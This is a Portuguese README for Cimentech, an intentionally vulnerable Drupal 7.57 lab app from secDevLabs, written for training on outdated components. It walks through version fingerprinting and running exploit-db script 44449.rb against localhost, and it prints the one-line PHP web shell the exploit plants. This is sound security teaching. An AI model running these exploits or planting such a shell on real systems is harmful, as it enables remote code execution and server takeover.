# Cimentech

[Access content in English](README.md)

<p align="center">
    <img src="images/attack1.png"/>
</p>

Cimentech é um aplicativo web simples construído com Drupal que contém um exemplo de um componente com uma vulnerabilidade conhecida e seu principal objetivo é demonstrar como um invasor pode explorá-lo.

## Index

- [Definição](#O-que-significa-usar-componentes-desatualizados-e-vulneráveis)
- [Como inicializar o aplicativo?](#como-inicializar-o-aplicativo)
- [Narrativa de ataque](#narrativa-de-ataque)
- [Objetivos](#proteger-este-aplicativo)
- [Soluções](#pr-soluções)
- [Contribuição](#contribuição)

## O que significa usar componentes desatualizados e vulneráveis?

Imagine que componentes, como bibliotecas, frameworks e outros módulos de software, sejam executados com os mesmos privilégios do aplicativo. Se um componente vulnerável for explorado, esse ataque pode facilitar a perda grave de dados ou o controle do servidor. Aplicativos e APIs que usam componentes com vulnerabilidades conhecidas podem prejudicar as defesas de aplicativos e permitir vários ataques e impactos.

O principal objetivo deste aplicativo é discutir como os **componentes desatualizados e vulneráveis** podem ser exploradas e incentivar os desenvolvedores a enviar solicitações de pull do secDevLabs sobre como mitigar essas falhas.

## Como inicializar o aplicativo?

Para iniciar este **aplicativo inseguro** intencionalmente, você precisará do [Docker][Docker Install] e do [Docker Compose][Docker Compose Install]. Depois de clonar o repositório [secDevLabs](https://github.com/globocom/secDevLabs), no seu computador, você deve digitar os seguintes comandos para iniciar o aplicativo:

```sh
cd secDevLabs/owasp-top10-2021-apps/a6/cimentech
```

```sh
make install
```

Depois é só visitar [localhost][app] ! 😆

## Conheça o app 🏗

Para entender corretamente como esse aplicativo funciona, você pode:

- Visitar sua página inicial!

## Narrativa de ataque

Agora que você conhece o propósito deste aplicativo, o que pode dar errado? A seção a seguir descreve como um invasor pode identificar e, eventualmente, encontrar informações confidenciais sobre o aplicativo ou seus usuários. Recomendamos que você siga estas etapas e tente reproduzi-las por conta própria para entender melhor o ataque! 😜

### 👀

#### O uso de uma versão vulnerável do Drupal permite a execução remota de código

É possível acessar a aplicação web do servidor a partir da porta HTTP padrão 80, como mostra a imagem abaixo:

<img src="images/attack1.png" align="center"/>

Depois, dando uma olhada no arquivo `/robots.txt`, é possível encontrar o arquivo `CHANGELOG.txt` no campo `Disallow`, conforme ilustrado na imagem abaixo:

<img src="images/attack2.png" align="center"/>

Ao ser acessado, pode-se encontrar uma indicação da versão do Sistema de Gerenciamento de Conteúdo (Drupal), conforme mostrado abaixo:

<img src="images/attack3.png" align="center"/>

Tendo a versão do CMS, é possível verificar em [exploit-db][3] se há algum exploit associado a essa versão, neste caso, Drupal 7.57. Os resultados da pesquisa estão descritos na imagem abaixo:

<img src="images/attack4.png" align="center"/>

Ao usar [searchsploit](https://www.exploit-db.com/searchsploit), um invasor também pode encontrar esse mesmo resultado por meio de um terminal. Para instalá-lo, basta digitar o seguinte em seu terminal OSX (lembre-se de que pode acionar seu software antivírus):

```sh
⚠️ 'O próximo comando irá instalar vários códigos de exploração em seu sistema e muitos deles podem acionar alertas de antivírus'

brew install exploitdb
```

Em seguida, basta procurar a versão do CMS encontrada:

```sh
searchsploit drupal 7.
```

Se você estiver usando OSX, este comando o ajudará a copiar o exploit para sua pasta `/tmp`:

```
cp /usr/local/opt/exploitdb/share/exploitdb/exploits/php/webapps/44449.rb /tmp
```

## 🔥

Executando o código Ruby malicioso, temos evidências de que a execução remota de código é possível no servidor web, usando os seguintes comandos conforme mostrado abaixo: 

```sh
ruby /tmp/44449.rb http://localhost
```

<img src="images/attack5.png" align="center"/>

**NOTA**: Você precisa ter o Ruby instalado em seu sistema para executar o exploit, para informações sobre como instalá-lo, clique [aqui][1]!

**NOTA 2**: Se você encontrar um erro de execução ao tentar executar o exploit, consulte este [Problema][4] para obter informações sobre como proceder. 

A exploração funciona adicionando ao servidor um `s.php` malicioso, que permite a execução remota de código através do seguinte conteúdo malicioso:
         
```php
<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
```

Usando o "fake shell" do exploit, podemos digitar um comando, como `whoami`, para verificar se realmente temos um RCE no servidor, conforme mostra a imagem:

<img src="images/attack6.png" align="center"/>

## Proteger este aplicativo

Como você arrumaria essa vulnerabilidade? Após suas alterações, um invasor não poderá:

- Execute o código remotamente através do exploit acima

## PR Soluções

[Alerta de spoiler 🚨 ] Para entender como essa vulnerabilidade pode ser resolvida, confira [these pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3ACimentech)!

## Contribuição

Nós encorajamos você a contribuir com o SecDevLabs! Por favor, confira a seção [Contribuição no SecDevLabs](../../../docs/CONTRIBUTING.md) de como fazer a sua contribuição!🎉 🎉

[docker install]: https://docs.docker.com/install/
[docker compose install]: https://docs.docker.com/compose/install/
[app]: http://localhost:80
[secdevlabs]: https://github.com/globocom/secDevLabs
[1]: https://www.ruby-lang.org/en/documentation/installation/
[2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2021-apps/a6/Cimentech
[3]: https://www.exploit-db.com/
[4]: https://github.com/globocom/secDevLabs/issues/212
